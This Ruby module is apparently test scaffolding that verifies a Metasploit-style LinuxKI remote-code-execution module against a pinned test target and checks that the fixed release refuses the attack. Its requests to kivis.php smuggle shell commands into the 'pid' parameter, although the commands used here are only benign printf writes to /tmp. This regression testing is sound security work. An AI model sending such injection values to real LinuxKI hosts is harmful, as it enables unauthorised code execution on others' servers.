# frozen_string_literal: true

require 'net/http'
require 'shellwords'
require_relative '../rsync_creds/native'

# Genuine package/interpreter and physical effects gate every owning verdict.
module LinuxkiTarget
  include RsyncCredentialTarget

  OWNER = 'exploit/linux/http/linuxki_rce'
  PAGE = '/linuxki/experimental/vis/kivis.php'

  def rc_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'linuxki-owner.json'), JSON.pretty_generate(@rc)) if @rc
  end

  def rc_resource_roles
    %w[target framework]
  end

  def lk_version
    self.class.metadata.fetch(:linuxki_version)
  end

  def lk_http(label, values)
    endpoint = target_endpoint('target')
    uri = URI::HTTP.build(host: endpoint.fetch('host'), port: endpoint.fetch('port'), path: PAGE, query: URI.encode_www_form(values))
    client = Net::HTTP.new(uri.hostname, uri.port, nil)
    client.open_timeout = 5
    client.read_timeout = 15
    response = client.start { |connection| connection.request(Net::HTTP::Get.new(uri)) }
    @rc[:native_http] << { label: label, values: values, code: response.code.to_i, body_base64: Base64.strict_encode64(response.body.to_s.b) }
    rc_save
    expect(response.code).to eq('200'), response.body
    response
  end

  def lk_file(path)
    raise ArgumentError, 'Invalid proof path' unless path.match?(%r{\A/tmp/module-target-linuxki-[a-z0-9_-]+\z})

    _, status = rc_command('file-exists', 'target', 'test', '-e', path, required: false)
    expect([0, 1]).to include(status)
    return { 'exists' => false } if status == 1

    content, = rc_command('file-bytes', 'target', 'cat', '--', path)
    uid, = rc_command('file-uid', 'target', 'stat', '-c', '%u', '--', path)
    { 'exists' => true, 'uid' => Integer(uid, 10), 'base64' => Base64.strict_encode64(content.b) }
  end

  def lk_remove(path)
    lk_file(path)
    rc_command('remove-proof', 'target', 'rm', '-f', '--', path)
    expect(lk_file(path)).to eq('exists' => false)
  end

  def lk_native(command, path, content, label)
    expected = { 'exists' => true, 'uid' => 33, 'base64' => Base64.strict_encode64(content.b) }
    expect(lk_file(path)).to eq('exists' => false)
    rc_command('native-shell-' + label, 'target', 'su', '-s', '/bin/sh', 'www-data', '-c', command)
    expect(lk_file(path)).to eq(expected)
    lk_remove(path)
    # A valid timestamp reaches the fixed release's numeric pid sanitation.
    # The second request reproduces the original module's omitted timestamp.
    [{ 'ts' => '1111_1111', 'start' => '0', 'end' => '1', 'iotime' => '0' }, {}].each_with_index do |query, index|
      response = lk_http(label + '-' + index.to_s, query.merge('type' => 'kitrace', 'pid' => '1;' + command + ';'))
      if lk_version == '6.0-1'
        expect(lk_file(path)).to eq(expected)
        expect(response.body).to include('LinuxKI trace records')
        lk_remove(path)
      else
        expect(lk_file(path)).to eq('exists' => false)
        expect(response.body).to include(index.zero? ? 'LinuxKI trace records' : 'Invalid Timestamp')
      end
    end
  ensure
    lk_remove(path) if path
  end

  def lk_ready
    pins = JSON.parse(File.read('test/module_targets/linuxki/vendor.json')).fetch(lk_version)
    version, = rc_command('package-version', 'target', 'dpkg-query', '-W', '-f=${Version}', 'linuxki')
    expect(version).to eq(lk_version)
    { '/opt/linuxki/kiinfo' => 'binary_sha256', '/opt/linuxki/experimental/vis/kivis.php' => 'page_sha256' }.each do |path, key|
      value, = rc_command('vendor-hash', 'target', 'sha256sum', path)
      expect(value.split.first).to eq(pins.fetch(key))
    end
    deps, = rc_command('native-abi', 'target', 'ldd', '/opt/linuxki/kiinfo')
    expect(deps).not_to include('not found')
    # The genuine CLI writes usage to stderr and exits 10.
    help, status = rc_command('native-help', 'target', 'sh', '-c', 'exec /opt/linuxki/kiinfo -help 2>&1', required: false)
    expect(status).to eq(10)
    expect(help).to include('Usage:   kiinfo [options ...]', '-kitrace [flag,flag...]')
    php, = rc_command('native-php', 'target', 'php', '--version')
    expect(php).to include('PHP 7.4.33')
    uid, = rc_command('apache-uid', 'target', 'id', '-u', 'www-data')
    expect(uid.strip).to eq('33')
    rc_resources('before')
    2.times do |index|
      path = "/tmp/module-target-linuxki-native-#{Process.pid}-#{index}"
      bytes = "Native caf\u00e9 \u96ea\r\nSecond line #{index}\n"
      command = 'printf %s ' + Shellwords.escape(bytes) + ' > ' + path
      lk_native(command, path, bytes, 'readiness-' + index.to_s)
    end
    @rc[:observer] = rc_json("begin;load 'test/module_targets/linuxki/observe.rb';LinuxkiObservation.install(framework,#{target_runtime.fetch('artifacts').inspect});end")
    @rc[:calibrated] = true
  end

  def lk_call(label, options = {}, action: 'check', reuse: false)
    offset = rc_json('framework.instance_variable_get(:@linuxki_events).length')
    call = { label: label, options: options, action: action }
    @rc[:calls] << call
    run_target_module(OWNER, 'target', { 'SSL' => false }.merge(options), action: action, reuse_module: reuse, allow_errors: true, command_timeout: 45) do |output|
      call[:output] = output
      call[:selection] = rc_json('active_module.object_id')
      call[:events] = rc_json("framework.instance_variable_get(:@linuxki_events).drop(#{offset})")
      rc_save
    end
    call
  end

  def lk_check
    call = lk_call('check')
    expected = lk_version == '6.0-1' ? { 'code' => 'vulnerable', 'reason' => 'The target is vulnerable' } : { 'code' => 'safe', 'reason' => 'The target is not vulnerable' }
    expect(call.fetch(:events).filter_map { |row| row['check'] }).to eq([expected])
    expect(call.fetch(:events).select { |row| row['owner_exploit_body'] }).to eq([])
  end

  def lk_commands(label, content)
    2.times do |index|
      path = "/tmp/module-target-linuxki-owner-#{Process.pid}-#{label}-#{index}"
      bytes = content + index.to_s
      command = 'printf %s ' + Shellwords.escape(bytes) + ' >> ' + path
      lk_native(command, path, bytes, label + '-' + index.to_s)
      if index.zero?
        console_command('back')
        console_command('use ' + OWNER)
        console_command('set TARGET 2')
        console_command('set PAYLOAD cmd/unix/generic')
      end
      # Preserve physical CR/LF and Unicode through the console parser.
      expect(rc_json("begin;active_module.datastore['CMD']=#{command.inspect};true;end")).to be(true)
      call = lk_call(label + '-' + index.to_s,
                     { 'AutoCheck' => index.zero?, 'ForceExploit' => false, 'DisablePayloadHandler' => true, 'AllowNoCleanup' => true, 'WfsDelay' => 0 },
                     action: 'run -z', reuse: true)
      expect(call.fetch(:selection)).to eq(@rc.fetch(:selection)) if index.positive?
      @rc[:selection] = call.fetch(:selection)
      expect(call.fetch(:events).count { |row| row['owner_exploit_body'] }).to eq(1)
      commands = call.fetch(:events).filter_map { |row| row['command_base64'] }
      expect(commands.last).to eq(Base64.strict_encode64(command.b))
      expect(commands.length).to eq(index.zero? ? 2 : 1)
      expect(call.fetch(:output)).not_to include('Exploit failed', 'Exploit aborted')
      expect(lk_file(path)).to eq('exists' => true, 'uid' => 33, 'base64' => Base64.strict_encode64(bytes.b))
    ensure
      lk_remove(path) if path
      rc_save
    end
  end

  def lk_refusal
    2.times do |index|
      call = lk_call('fixed-refusal-' + index.to_s,
                     { 'AutoCheck' => true, 'ForceExploit' => false, 'WfsDelay' => 0, 'LHOST' => listener_host, 'DisablePayloadHandler' => true, 'AllowNoCleanup' => true },
                     action: 'run -z', reuse: index.positive?)
      expect(call.fetch(:selection)).to eq(@rc.fetch(:selection)) if index.positive?
      @rc[:selection] = call.fetch(:selection)
      expect(call.fetch(:events).filter_map { |row| row['check'] }).to eq([{ 'code' => 'safe', 'reason' => 'The target is not vulnerable' }])
      expect(call.fetch(:events).select { |row| row['owner_exploit_body'] }).to eq([])
      expect(call.fetch(:events).select { |row| row['command_base64'] }.length).to eq(1)
      expect(call.fetch(:output)).to include('Exploit aborted')
    end
  end

  def lk_registry
    expect(rc_json('{sessions:framework.sessions.keys,jobs:framework.jobs.keys}')).to eq('sessions' => [], 'jobs' => [])
  end
end
